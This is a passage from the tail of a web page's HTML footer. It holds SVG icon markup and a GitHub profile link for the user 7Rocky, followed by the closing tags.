0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
